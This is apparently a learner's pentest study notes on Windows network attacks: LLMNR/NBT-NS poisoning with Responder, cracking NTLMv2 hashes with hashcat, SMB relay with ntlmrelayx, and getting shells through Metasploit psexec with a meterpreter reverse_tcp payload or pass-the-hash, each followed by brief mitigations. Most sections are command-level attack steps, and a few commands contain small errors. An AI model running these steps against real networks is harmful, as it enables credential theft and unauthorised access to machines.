
# Attack 1 : LLMNR poisoning

LLMNR (**Link Local Multicast Name Resolution**) is used to identify hosts when DNS fails to do so.

**It is enabled by default!**

Previously it was called NBT-NS

The services utilize a username and a NTLMv2 hash when they responds
- so we can capture traffic as MIMT

The idea is that the server asks for username and hash to connect a client to another one:

![[Pasted image 20241217153223.png]]

==**The problem arises because the request of connection is sent in broadcast.**==

## Step 1: run responder

```bash 
sudo responder -I interface (eth0) -dwP
```
- `d` is for DHCP requests
- `w` is for WPAD proxy that allows browsers to automatically discover a proxy 
- `P` forces the NTLM authentication for the proxy
- `v` is verbose
This command responds to the traffic we receive.

Since the request for accessing a client is in broadcast it will respond to the victim:
- do it in the morning or after lunch (the idea is that it will work when a pc does requests)


## Step 2: trigger an event
Example we request on network at 
```bash
\\10.8.0.2
```


![[Pasted image 20241217153913.png]]


## Step 3: intercept hash with responder
As soon as the traffic is generated then we will see on our responder:
- ![[Pasted image 20241217154012.png]]


With hashcat we can crack the hash to discover the password.

## Step 4: crack hash
With hashcat we can crack the password:
```bash
hashcat hash.txt
```
- to get the code to crack it 

Then:
```bash
hashcat -m 5600 hash.txt rockyou.txt --show
rockyou.txt```
- or sometimes 5500


## Mitigation
the best defense is tp disable LLMNR and NBT-NS:
- To diable it we have to go on the server and policies
- ![[Pasted image 20241217160554.png]]

If we cannot disable it:
- ![[Pasted image 20241217160618.png]]





# Attack 2: SMB Relay

Instead crack hashes what we can do is to relay those to specific machines and gain access.
- *For example the hash cannot be cracked*

**==To perform it:**
- **==SMB signing must be disabled or not enforced==**
- **==The credential we stole must be an admin on the machine we want to access==** 




## Step 1: identify if the target has the SMB signing or not

We can do it using nmap:
```bash
nmap --script=smb2-security-mode.nse -p4445 (IP) -Pn
```
-  generally we start with the Domain controller IP but we can do `192.168.1.0/24`
- `-Pn` is done to avoid the ping (namp sees if the target is alive with the ping some machines disable ping, so the scan is stopped without -Pn)


At this point we create a `target.txt` file.

## Step 2: run responder 

First of all we need to modify responder configuration file:
```bash
sudo mousepad /etc/responder/Responder.conf
```
- ![[Pasted image 20241217161418.png]]



Now we can run responder:
```bash
sudo responder -I eth0 -dwP
```


## Step 3: setup relay
To setup our relay we can use a script called ntlmrelayx.py:
```bash
sudo ntlmrelayx.py -tf targets.txt -smb2support
```
- ![[Pasted image 20241217161801.png]]



## Step 4: Trigger an event
Example we request on network at 
```bash
\\10.8.0.2
```


![[Pasted image 20241217153913.png]]



## Step 5: analyse traffic
At this point we can analyse traffic to see if something is captured on the relay:
- ![[Pasted image 20241217162034.png]]



To gain a shell we can change the command to:
```shell
sudo ntlmrelayx.py -tf targets.txt -smb2support -i 
```

And then run on the attack machine:
```bash
nc 127.0.0.1 11000
```


## Mitigation
To mitigate SMB relay we can:
- Enable SMB signing on all devices
- Disable NTML authentication on the nework (but if kerberos stops then it turn back to NTLM )
- Tier the account (limit domain admins to specific tasks)
- Restrict local admin

## Gain shell access with credentials cracked
We can gain a shell acces using metasploit with `exploit/windows/smb/psexec`. We just need to set the information:
- ![[Pasted image 20241217163749.png]]


First of all we need to set the payload:
```shell
set payload windows/x64/meterpreter/reverse_tcp
```

Then:
```bash
set rhosts IP
set smbdomain domain
set smbuser username
set smbpass Password
```
## Gain shell access with hash NOT CRACKED
The idea is the same but we set as password the hash:
- ![[Pasted image 20241217163921.png]]



We can also use `psexec.py`:
- ![[Pasted image 20241217164021.png]]
- ![[Pasted image 20241217164240.png]]

